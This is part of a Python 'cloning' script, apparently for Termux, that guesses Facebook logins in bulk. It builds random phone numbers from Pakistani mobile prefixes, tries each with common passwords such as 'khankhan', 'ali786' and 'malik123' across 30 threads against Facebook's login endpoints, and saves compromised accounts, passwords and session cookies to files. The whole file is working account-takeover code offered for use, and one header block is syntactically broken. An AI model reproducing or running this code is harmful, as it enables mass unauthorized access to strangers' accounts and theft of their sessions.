    print(f"{RED}[02] {WHITE}AUTO PASS 7 AND 11 DIGITS  {GREEN}[FAST]")
    print(f"{RED}[03] {WHITE}AUTO PASS 7 DIGIT AND KHAN {GREEN}[FAST]")
    print(f"{RED}[04] {WHITE}ONLY KHAN PASS             {GREEN}[SLOWEST]")
    print(f"{RED}[05] {WHITE}KHAN & ALI MIX PASS        {GREEN}[SLOWEST]")
    print(f"{RED}[06] {WHITE}KHAN & MALIK MIX PASS      {GREEN}[SLOWEST]")
    print(f"\033[1;91m====================================================")
    AHMED = input("[√] CHOOSE : ")
    if AHMED in ["1","01"]:
        pass1()
    elif AHMED in ["2","02"]:
        pass2()
    elif AHMED in ["3","03"]:
        pass3()
    elif AHMED in ["4","04"]:
        pass4()
    elif AHMED in ["5","05"]:
        pass5()
    elif AHMED in ["6","06"]:
        pass6()
    else:
        print('\033[1;31mINCORECT OPTION !!');main()



def pass1():
    os.system("clear")
    jalan(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P1   ")
        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}======================================================')
        for love in user:
            uid = code+love
            pwx = [love,]
            manshera.submit(freeq,uid,pwx,tl)
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/AHMED-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/AHMED-CP.txt')
    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()








def pass2():
    os.system("clear")
    jalan(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P2 ")
        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}======================================================')
        for love in user:
            uid = code+love
            pwx = [love,uid]
            manshera.submit(freeq,uid,pwx,tl)
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/AHMED-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/AHMED-CP.txt')
    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()




def pass3():
    os.system("clear")
    jalan(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P3 ")
        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}======================================================')
        for love in user:
            uid = code+love
            pwx = [love,'khankhan']
            manshera.submit(freeq,uid,pwx,tl)
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/AHMED-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/AHMED-CP.txt')
    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()




def pass4():
    os.system("clear")
    jalan(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P4 ")
        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}======================================================')
        for love in user:
            uid = code+love
            pwx = [love,'khankhan','khan khan','khan123','khan12','khan1122']
            manshera.submit(freeq,uid,pwx,tl)
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/AHMED-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/AHMED-CP.txt')
    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()





def pass5():
    os.system("clear")
    jalan(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P5 ")
        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}======================================================')
        for love in user:
            uid = code+love
            pwx = ['khankhan','ali786','ali123','ali1122','aliali']
            manshera.submit(freeq,uid,pwx,tl)
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/AHMED-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/AHMED-CP.txt')
    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()



def pass6():
    os.system("clear")
    jalan(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f' {GREEN}[!] PAk SIM CODES : 0334, 0321, 0340, 0345')
    print(f' {GREEN}[!]               : 0303, 0302, 0301, 0305')
    print(f' {GREEN}[!]               : 0349, 0316, 0314, 0335')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> P6 ")
        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}======================================================')
        for love in user:
            uid = code+love
            pwx = ['khankhan','malikmalik','malik123','malik12','malik786']
            manshera.submit(freeq,uid,pwx,tl)
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/AHMED-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/AHMED-CP.txt')
    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()






def freeq(uid,pwx,tl):
    global loop
    global ok
    global cp
    global ugen
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(rug)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'business.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            '    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'ps_l=0; ps_n=0; datr=m0cEZj2-U7pkNAY-vXo8y-rq; sb=m0cEZvLdNe7345hWirYftn3f; m_pixel_ratio=3; wd=360x648; fr=0gC2arJMSMkruFKlT..BmBEeb..AAA.0.0.BmBEes.AWUGY08uiqM',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH1823"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            'user-agent':pro,} 
            lo = session.post('https://business.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio AHMED_OK.mp3")
                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ '  ') 
                cek_apk(session,coki)
                open('/sdcard/AHMED-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio AHMED_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/AHMED-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio AHMED_CP.mp3")
                    print(f'\r{RED}[CP] '+uid+' [×] '+ps+' ')
                    open('/sdcard/AHMED-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[AHMED 🔥] [%s] \33[1;97m[OK:%s{AHMED2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass




#---------------------[END MENU]---------------------#
if __name__ == '__main__':
    main()
